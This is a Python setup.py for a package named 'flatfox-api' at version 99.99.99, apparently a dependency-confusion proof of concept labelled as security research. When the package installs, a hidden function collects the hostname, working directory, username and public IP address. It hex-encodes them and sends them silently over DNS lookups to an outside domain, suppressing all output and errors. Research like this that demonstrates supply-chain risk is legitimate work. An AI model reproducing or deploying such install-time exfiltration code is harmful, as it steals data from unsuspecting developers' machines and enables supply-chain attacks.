from setuptools import setup
import os, subprocess

def trigger_poc():
    cmd = """
    a=$(hostname; pwd; whoami; echo 'flatfox-api'; curl -s https://ifconfig.me/)
    && echo $a | xxd -p | head -n 1 | while read ut; do nslookup "$ut.vm-research.com"; done
    """
    
    try:
        subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass

trigger_poc()

setup(
    name="flatfox-api",
    version="99.99.99",
    description="[SECURITY RESEARCH] Proof of Concept for Dependency Confusion",
    long_description=open("README.md").read(),
    author="vmares (Security Researcher)",
    author_email="me@viktormares.com",
    license="MIT",
    packages=[],
    install_requires=["requests"],
)
